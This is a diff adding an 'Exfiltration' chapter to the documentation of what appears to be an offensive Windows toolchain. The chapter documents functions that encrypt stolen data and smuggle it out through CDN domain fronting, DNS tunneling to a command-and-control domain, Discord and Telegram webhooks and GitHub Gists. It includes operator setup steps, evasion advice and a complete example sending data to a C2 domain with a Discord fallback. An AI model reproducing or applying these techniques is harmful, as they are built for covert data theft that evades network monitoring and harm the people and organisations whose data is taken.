@@ -824,6 +824,183 @@ fn main() -> void {
 
 ---
 
+## 11  Exfiltration  *(Windows only)*
+
+Six functions covering encryption plus four covert channels.
+
+> **Operational note:** always call `jocky_exfil_encrypt` before passing data
+> to a channel function so the transmitted bytes reveal nothing about the
+> original content even if the transport is observed.
+
+---
+
+### `jocky_exfil_encrypt(data, data_len, out, out_len) -> bool`
+
+Generate a fresh random 16-byte RC4 session key, prepend it to `out`, and
+encrypt `data` into `out+16`.
+
+```
+out layout:  [ 16 bytes: random RC4 key ][ data_len bytes: RC4(data, key) ]
+```
+
+`out` must be at least `data_len + 16` bytes.  `*out_len` is set to
+`data_len + 16` on success.
+
+The receiver recovers plaintext by calling `jocky_decrypt_rc4(blob+16, len-16, blob, 16)`.
+
+```
+ffi jocky_exfil_encrypt(i8*, i64, i8*, i8*) -> bool;
+```
+
+---
+
+### `jocky_exfil_front(front_host, real_host, path, data, data_len) -> bool`
+
+**Domain fronting via CDN** — POST `data` over HTTPS by exploiting the
+gap between TLS SNI (what network inspection sees) and the HTTP Host header
+(what the CDN routes on).
+
+| Parameter    | Meaning |
+|--------------|---------|
+| `front_host` | CDN hostname used for TCP + TLS SNI, e.g. `"d111111abcdef8.cloudfront.net"` |
+| `real_host`  | Actual backend injected as the HTTP `Host:` header |
+| `path`       | URL path on the backend, e.g. `"/collect"` |
+| `data`       | Request body (encrypt first) |
+
+Network inspection logs a TLS connection to the CDN's domain.  The CDN
+forwards the request to `real_host` based on the `Host` header.
+
+```
+ffi jocky_exfil_front(i8*, i8*, i8*, i8*, i64) -> bool;
+```
+
+---
+
+### `jocky_exfil_dns(c2_domain, data, data_len) -> bool`
+
+**DNS tunneling** — encode `data` as a sequence of DNS A-record queries.
+No direct TCP/UDP connection to the C2 is needed; only DNS (port 53) must
+reach the system resolver.
+
+**Query format:**
+
+```
+<4-hex-seq>.<16-char-base32-chunk>.<c2_domain>
+```
+
+Each chunk carries 10 bytes of data (10 bytes → 16 base32 chars, well within
+the 63-char DNS label limit).  Sequence numbers allow the authoritative
+resolver to reassemble out-of-order queries.  A terminal sentinel query:
+
+```
+FFFF.END.<c2_domain>
+```
+
+signals end-of-stream.  DNS responses are not used; only the query labels
+carry data.
+
+**Server-side setup:** configure the authoritative NS for `c2_domain` to log
+all queries.  Parse labels, base32-decode each chunk, reassemble by sequence.
+
+```
+ffi jocky_exfil_dns(i8*, i8*, i64) -> bool;
+```
+
+---
+
+### `jocky_exfil_discord(webhook_url, data, data_len) -> bool`
+
+**Discord webhook** — POST `base64(data)` as a Discord message using an
+Incoming Webhook.
+
+| Limit | Value |
+|-------|-------|
+| Max `content` field | 2 000 chars |
+| Max data per call   | ≈ 1 500 bytes |
+
+Data larger than 1 500 bytes is automatically split into multiple webhook
+calls.
+
+```
+ffi jocky_exfil_discord(i8*, i8*, i64) -> bool;
+```
+
+**`webhook_url`** — full URL from the Discord webhook configuration, e.g.
+`"https://discord.com/api/webhooks/1234567890/TOKEN"`.
+
+---
+
+### `jocky_exfil_telegram(bot_token, chat_id, data, data_len) -> bool`
+
+**Telegram Bot API** — deliver `base64(data)` as a `sendMessage` call to a
+bot-accessible chat or channel.
+
+| Limit | Value |
+|-------|-------|
+| Max `text` field  | 4 096 chars |
+| Max data per call | ≈ 3 000 bytes |
+
+Data larger than 3 000 bytes is chunked automatically.
+
+```
+ffi jocky_exfil_telegram(i8*, i8*, i8*, i64) -> bool;
+```
+
+**Setup:** create a bot via `@BotFather`, add it to the target channel,
+retrieve the `chat_id` via `getUpdates`.
+
+---
+
+### `jocky_exfil_github(token, gist_id, data, data_len) -> bool`
+
+**GitHub Gist** — PATCH a Gist file (`d.txt`) with `base64(data)` via the
+GitHub REST API.  The Gist can be secret (not listed publicly).
+
+```
+ffi jocky_exfil_github(i8*, i8*, i8*, i64) -> bool;
+```
+
+| Parameter  | Meaning |
+|------------|---------|
+| `token`    | PAT or fine-grained token with `gist` scope |
+| `gist_id`  | 32-hex-char Gist ID from the URL |
+
+**Retrieval:** `GET /gists/<gist_id>` and decode `files["d.txt"].content`.
+
+---
+
+### Full exfiltration example
+
+```
+ffi jocky_exfil_encrypt(i8*, i64, i8*, i8*) -> bool;
+ffi jocky_exfil_dns(i8*, i8*, i64)           -> bool;
+ffi jocky_exfil_discord(i8*, i8*, i64)       -> bool;
+
+fn exfil(raw: i8*, raw_len: i64) -> void {
+    // Allocate out buffer: raw_len + 16
+    let enc_buf: i8* = 0;      // allocate raw_len + 16
+    let enc_len: i64 = 0;
+
+    let ok: bool = jocky_exfil_encrypt(raw, raw_len, enc_buf, &enc_len);
+    if !ok { return; }
+
+    // Primary: DNS (no direct TCP to C2)
+    let sent: bool = jocky_exfil_dns("exfil.c2.example.com", enc_buf, enc_len);
+
+    // Fallback: Discord webhook
+    if !sent {
+        jocky_exfil_discord(
+            "https://discord.com/api/webhooks/111222333/TOKEN",
+            enc_buf, enc_len
+        );
+    }
+}
+```
+
+---
+
+---
+
 ## Build Pipeline & PE Section Layout
 
 `jockyc` runs these post-link steps (Windows, in order):
